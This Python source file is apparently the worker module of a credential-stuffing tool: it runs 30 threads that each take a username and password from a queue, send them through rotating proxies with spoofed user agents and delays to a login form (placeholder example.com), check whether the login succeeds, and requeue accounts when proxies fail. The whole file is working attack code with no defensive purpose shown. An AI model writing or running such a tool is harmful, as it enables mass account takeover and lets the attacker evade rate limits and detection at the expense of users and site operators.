import queue
import threading
import functions
import requests
import proxies
import accounts


threads = []
worker = None


class Worker(threading.Thread):
    def __init__(self, timeout, proxy_list, accounts_list , thread_id):
        threading.Thread.__init__(self)
        self.timeout = timeout
        self.proxy_list = proxy_list
        self.accounts_list = accounts_list
        self.thread_id = thread_id


    def run(self):

        login_details = accounts.parse_accounts(accounts.accounts_list.get())
        proxy_ip = proxies.get_proxy(proxies.proxy_list)
        #print(' - Using proxy - ' + (str(proxy_ip['https']) + ' for account : ' +  str(login_details['uname']) + ':' + str(login_details['password'])))
        functions.delay()

        try:
            response = requests.post('https://www.example.com/index.php',data=login_details, proxies=proxy_ip, timeout=20,headers=functions.set_user_agent())
            proxies.put_proxy(proxy_ip)
            accounts.is_logged_in(response,login_details)

        except requests.exceptions.Timeout :
            #print('* Removing dead proxy (Timeout) : ' + proxy_ip['https'])
            accounts.put_account(login_details)
            #print('** Account back to queue ---> ' + str(login_details['uname']) + ':' + str(login_details['password']))
        except requests.exceptions.ProxyError :
            #print('* Removing dead proxy (Max Retries) : ' + proxy_ip['https'])
            accounts.put_account(login_details)
            #print('** Account back to queue ---> ' + str(login_details['uname']) + ':' + str(login_details['password']))
        except requests.exceptions.SSLError :
            #print('* Removing dead proxy (SSL Error) : ' + proxy_ip['https'])
            accounts.put_account(login_details)
            #print('** Account back to queue ---> ' + str(login_details['uname']) + ':' + str(login_details['password']))
        except requests.exceptions.ConnectionError :
            #print('* Removing dead proxy (Bad Status Line) : ' + proxy_ip['https'])
            accounts.put_account(login_details)
            #print('** Account back to queue ---> ' + str(login_details['uname']) + ':' + str(login_details['password']))


    def set_threads(num_threads, timeout, proxy_list, accounts_list):
        for i in range(num_threads):  # Number of threads
            worker = Worker(timeout, proxy_list, accounts_list ,i)
            worker.setDaemon(True)
            worker.start()
            threads.append(worker)


def run_loop():
    while accounts.accounts_list.qsize() > 0:
        Worker.set_threads(30, 10, proxies.proxy_list, accounts.accounts_list)
        for item in threads:
            item.join()